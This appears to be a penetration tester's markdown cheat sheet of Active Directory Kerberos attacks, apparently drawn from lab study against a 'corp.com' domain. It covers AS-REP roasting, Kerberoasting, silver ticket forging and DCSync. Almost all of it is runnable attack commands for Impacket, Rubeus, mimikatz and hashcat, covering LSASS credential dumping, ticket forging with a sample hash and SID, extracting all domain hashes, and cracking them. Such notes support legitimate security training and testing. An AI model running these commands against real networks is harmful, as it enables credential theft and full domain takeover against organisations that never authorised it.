## AS-REP Roasting
**Note:** Only works if Kerberos Pre-authentication is disabled (which it isn't by default). Does not require any Domain credentials.
###### Check for Kerberos Preauthentication (PowerView)
`Get-DomainUser -PreauthNotRequired`
###### Check for Kerberos Preauthentication (Impacket)
`impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete`
###### Check for Kerberos Preauthenticaion (Impacket) All Users
`impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/ -no-pass -request`
###### WriteProperty
If we only have WriteProperty over an account instead of GenericAll, we can make it become AS-REP Roastable
`Set-ADUser -Identity "victimuser" -UserAccountControl 4194304`
###### Attack from Kali
``impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete``
###### Attack from Windows
`.\Rubeus.exe asreproast /nowrap`
**Note:** Hashes are automatically in Hashcat format
###### Crack Hashes
`sudo hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force`

---
## Kerberoasting
**Note:** Requires valid Domain credentials
###### Set SPN for User if we control User Object
`setspn -a <SPN> <UserAccount>`
`setspn -a http/myservice jen`
###### Delete SPN
`setspn -d service/name hostname`
###### Attack from Kali
`sudo impacket-GetUserSPNs -request -dc-ip 192.168.142.70 corp.com/pete`
**Note:** If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.
`sudo ntpdate <domain-controller-ip>`
`sudo rdate -n <domain-controller-ip>`
###### Attack from Windows
`.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
###### Crack Hashes
`sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r best64.txt --force`

---
## Silver Ticket Attack
Authenticate against services.
###### Required Info:
- SPN password hash (NTLM hash of the service account)
- Domain SID (Security Identifier of the domain)
- Target SPN (The service you want to forge a ticket for, e.g., `CIFS`, `HTTP`, `MSSQLSvc`)
###### Obtain hash:
`.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
**Note:** This generates a lot of output. Identify the password hash of the target service account.
###### Obtain SID
`whoami /user`
###### Obtain SPN (PowerView)
``Get-NetUser -SPN | select samaccountname,serviceprincipalname``
Depends on the service. For HTTP it might be something like `HTTP/web04.corp.com:80`
###### Forge Ticket
`kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:peteadmin`
**Note:** Make sure to remove the RID (last 4 digits) from the SID
`rc4:` is the password hash of the service account
###### Access the Service
`dir \\Files04.shellcorp.com\C$`
**Note:** This will give you privileged access on the device in the context of the service. For MSSQL, this means you can execute OS Commands via XP_CMDSHELL. For HTTP, it depends on the function of the web application.
If successful, from the perspective of the ISS application, the current user will be both built-in local admin and a member of privileged groups. This can be seen in the output under `User Id` and `Groups Id`.


---
## Domain Controller Synchronisation
Dump hashes from the DC.
###### Requirements
- Local Admin (for mimikatz)
- User needs to have the following rights:
	- Replicating Directory Changes
	- Replicating Directory Changes All
	- Replicating Directory Changes in Filtered Set
###### Attack from Kali
`impacket-secretsdump -just-dc-user Administrator corp.com/<username>:"<password>"@<domain-controller-ip>`
###### Extract All Hashes
`impacket-secretsdump -just-dc corp.com/<username>:<password>@<domain-controller-ip>`
###### Extract Hashes Locally
`impacket-secretsdump -sam SAM -system SYSTEM LOCAL`
###### Attack from Windows
`.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:corp\Administrator"`
This returns an NTLM hash for cracking.
###### Crack
`hashcat -m 1000 hashes.dcsync rockyou.txt -r best64.rule --force`